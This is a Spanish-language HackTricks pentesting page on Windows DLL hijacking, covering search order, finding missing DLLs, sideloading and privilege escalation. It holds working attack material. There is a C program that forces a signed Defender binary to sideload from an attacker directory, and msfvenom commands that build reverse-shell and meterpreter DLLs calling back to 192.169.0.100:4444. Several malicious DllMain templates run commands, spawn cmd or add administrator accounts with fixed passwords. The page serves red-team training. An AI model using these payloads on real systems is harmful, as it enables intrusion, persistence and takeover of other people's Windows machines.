# Dll Hijacking

{{#include ../../banners/hacktricks-training.md}}



## Información Básica

DLL Hijacking implica manipular una aplicación confiable para que cargue una DLL maliciosa. Este término abarca varias tácticas como **DLL Spoofing, Injection, and Side-Loading**. Se utiliza principalmente para code execution, lograr persistence y, menos comúnmente, privilege escalation. A pesar del enfoque en la escalation aquí, el método de hijacking se mantiene consistente según el objetivo.

### Common Techniques

Se emplean varios métodos para DLL hijacking, y su efectividad depende de la estrategia de carga de DLL de la aplicación:

1. **DLL Replacement**: Sustituir una DLL legítima por una maliciosa, opcionalmente usando DLL Proxying para preservar la funcionalidad original de la DLL.
2. **DLL Search Order Hijacking**: Colocar la DLL maliciosa en una ruta de búsqueda antes que la legítima, explotando el patrón de búsqueda de la aplicación.
3. **Phantom DLL Hijacking**: Crear una DLL maliciosa para que la aplicación la cargue, creyendo que es una DLL requerida inexistente.
4. **DLL Redirection**: Modificar parámetros de búsqueda como %PATH% o archivos .exe.manifest / .exe.local para dirigir la aplicación hacia la DLL maliciosa.
5. **WinSxS DLL Replacement**: Sustituir la DLL legítima por una maliciosa en el directorio WinSxS, un método a menudo asociado con DLL side-loading.
6. **Relative Path DLL Hijacking**: Colocar la DLL maliciosa en un directorio controlado por el usuario junto con la aplicación copiada, asemejándose a técnicas de Binary Proxy Execution.

## Buscar Dlls faltantes

La forma más común de encontrar DLLs faltantes dentro de un sistema es ejecutar [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) de sysinternals, **configurando** los **siguientes 2 filtros**:

![](<../../images/image (311).png>)

![](<../../images/image (313).png>)

y simplemente mostrar la **File System Activity**:

![](<../../images/image (314).png>)

Si estás buscando **DLLs faltantes en general** deja esto ejecutándose durante unos **segundos**.\
Si buscas una **DLL faltante dentro de un ejecutable específico** debes configurar **otro filtro como "Process Name" "contains" "\<exec name>"**, ejecutarlo y detener la captura de eventos.

## Explotación de DLLs faltantes

Para poder escalate privileges, la mejor oportunidad es poder **escribir una DLL que un proceso con privilegios intentará cargar** en alguno de los **lugares donde será buscada**. Por lo tanto, podremos **escribir** una DLL en una **carpeta** donde la **DLL se busca antes** de la carpeta donde está la **DLL original** (caso raro), o seremos capaces de **escribir en alguna carpeta donde se va a buscar la DLL** y la **DLL original no exista** en ninguna carpeta.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Las aplicaciones de Windows buscan DLLs siguiendo un conjunto de rutas de búsqueda predefinidas, respetando una secuencia particular. El problema del DLL hijacking aparece cuando una DLL maliciosa se coloca estratégicamente en uno de estos directorios, asegurando que se cargue antes que la DLL auténtica. Una solución para prevenir esto es asegurarse de que la aplicación use rutas absolutas cuando hace referencia a las DLL que requiere.

Puedes ver el **DLL search order on 32-bit** systems abajo:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Ese es el orden de búsqueda **por defecto** con **SafeDllSearchMode** habilitado. Cuando está deshabilitado, el directorio actual asciende a la segunda posición. Para desactivar esta característica, crea el valor de registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** y configúralo a 0 (por defecto está habilitado).

Si la función [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) se llama con **LOAD_WITH_ALTERED_SEARCH_PATH**, la búsqueda comienza en el directorio del módulo ejecutable que está cargando **LoadLibraryEx**.

Finalmente, ten en cuenta que **una DLL puede cargarse indicando la ruta absoluta en lugar del nombre**. En ese caso esa DLL **solo será buscada en esa ruta** (si la DLL tiene dependencias, estas se buscarán como si se hubieran cargado solo por nombre).

Existen otras formas de alterar el orden de búsqueda pero no las voy a explicar aquí.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Una forma avanzada de influir de manera determinista en la ruta de búsqueda de DLL de un proceso recién creado es establecer el campo DllPath en RTL_USER_PROCESS_PARAMETERS al crear el proceso con las APIs nativas de ntdll. Al proporcionar un directorio controlado por el atacante aquí, un proceso objetivo que resuelva una DLL importada por nombre (sin ruta absoluta y sin usar las banderas de carga seguras) puede verse forzado a cargar una DLL maliciosa desde ese directorio.

Idea clave
- Build the process parameters with RtlCreateProcessParametersEx and provide a custom DllPath that points to your controlled folder (e.g., the directory where your dropper/unpacker lives).
- Create the process with RtlCreateUserProcess. When the target binary resolves a DLL by name, the loader will consult this supplied DllPath during resolution, enabling reliable sideloading even when the malicious DLL is not colocated with the target EXE.

Notas/limitaciones
- This affects the child process being created; it is different from SetDllDirectory, which affects the current process only.
- The target must import or LoadLibrary a DLL by name (no absolute path and not using LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs and hardcoded absolute paths cannot be hijacked. Forwarded exports and SxS may change precedence.

Minimal C example (ntdll, wide strings, simplified error handling):
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
Operational usage example
- Coloca un xmllite.dll malicioso (exportando las funciones requeridas o haciendo proxy al real) en tu directorio DllPath.
- Lanza un binario firmado que sepas que busca xmllite.dll por nombre usando la técnica anterior. El loader resuelve la importación vía el DllPath suministrado y sideloads tu DLL.

Esta técnica se ha observado en-the-wild para impulsar cadenas de sideloading multi-etapa: un launcher inicial deja caer un DLL auxiliar, que luego crea un binario firmado por Microsoft, hijackeable, con un DllPath personalizado para forzar la carga del DLL del atacante desde un directorio de staging.


#### Excepciones en el orden de búsqueda de dll según la documentación de Windows

Ciertas excepciones al orden estándar de búsqueda de DLL se señalan en la documentación de Windows:

- Cuando se encuentra una **DLL que comparte su nombre con otra ya cargada en memoria**, el sistema omite la búsqueda habitual. En su lugar, realiza una comprobación de redirección y de manifiesto antes de usar la DLL ya en memoria. **En este escenario, el sistema no realiza una búsqueda de la DLL**.
- En los casos en que la DLL es reconocida como una **known DLL** para la versión actual de Windows, el sistema utilizará su versión de la known DLL, junto con cualquiera de sus DLL dependientes, **omitiendo el proceso de búsqueda**. La clave del registro **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contiene la lista de estas known DLLs.
- Si una **DLL tiene dependencias**, la búsqueda de estas DLL dependientes se realiza como si hubieran sido indicadas solo por sus **module names**, independientemente de si la DLL inicial fue identificada mediante una ruta completa.

### Escalada de privilegios

**Requisitos**:

- Identifica un proceso que opere o vaya a operar bajo **privilegios diferentes** (movimiento horizontal o lateral), que **carezca de una DLL**.
- Asegúrate de que **exista acceso de escritura** en cualquier **directorio** en el que se **buscará la DLL**. Esta ubicación puede ser el directorio del ejecutable o un directorio dentro de la ruta del sistema.

Sí, los requisitos son complicados de encontrar ya que **por defecto es algo raro encontrar un ejecutable privilegiado que le falte una dll** y es aún **más raro tener permisos de escritura en una carpeta de la ruta del sistema** (por defecto no puedes). Pero, en entornos mal configurados esto es posible.\
En el caso de que tengas suerte y cumplas los requisitos, podrías revisar el proyecto [UACME](https://github.com/hfiref0x/UACME). Incluso si **el objetivo principal del proyecto es bypass UAC**, puede que encuentres allí una **PoC** de un Dll hijaking para la versión de Windows que puedas usar (probablemente solo cambiando la ruta de la carpeta donde tienes permisos de escritura).

Ten en cuenta que puedes **comprobar tus permisos en una carpeta** haciendo:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Y **comprueba los permisos de todas las carpetas dentro de PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
También puedes comprobar las importaciones de un ejecutable y las exportaciones de una dll con:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Para una guía completa sobre cómo **abusar Dll Hijacking para escalar privilegios** con permisos para escribir en una **carpeta del System Path** consulta:


{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Herramientas automatizadas

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) comprobará si tienes permisos de escritura en cualquier carpeta dentro del PATH del sistema.\
Otras herramientas automatizadas interesantes para descubrir esta vulnerabilidad son las **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ y _Write-HijackDll._

### Example

En caso de encontrar un escenario explotable, una de las cosas más importantes para explotarlo con éxito sería **crear una dll que exporte al menos todas las funciones que el ejecutable importará de ella**. De todas formas, ten en cuenta que Dll Hijacking resulta útil para [escalar desde el nivel de Integridad Medium a High **(bypassing UAC)**](../authentication-credentials-uac-and-efs.md#uac) o desde[ **High Integrity a SYSTEM**](#from-high-integrity-to-system)**.** Puedes encontrar un ejemplo de **cómo crear una dll válida** dentro de este estudio sobre dll hijacking enfocado en dll hijacking para ejecución: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Además, en la **siguiente secció**n puedes encontrar algunos **códigos dll básicos** que podrían ser útiles como **plantillas** o para crear una **dll con funciones no requeridas exportadas**.

## **Creación y compilación de Dlls**

### **Proxificación de Dll**

Básicamente un **Dll proxy** es un Dll capaz de **ejecutar tu código malicioso cuando se carga** pero también de **exponer** y **funcionar** como se **espera** reencaminando todas las llamadas a la librería real.

Con la herramienta [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) o [**Spartacus**](https://github.com/Accenture/Spartacus) puedes realmente **indicar un ejecutable y seleccionar la librería** que quieres proxificar y **generar una proxified dll** o **indicar la Dll** y **generar una proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obtener un meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Crear un usuario (x86 no vi una versión x64):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Tu propio

Ten en cuenta que en varios casos la Dll que compiles debe **exportar varias funciones** que van a ser cargadas por el victim process, si estas funciones no existen la **binary no podrá cargarlas** y el **exploit fallará**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Referencias

- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)



- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)


{{#include ../../banners/hacktricks-training.md}}
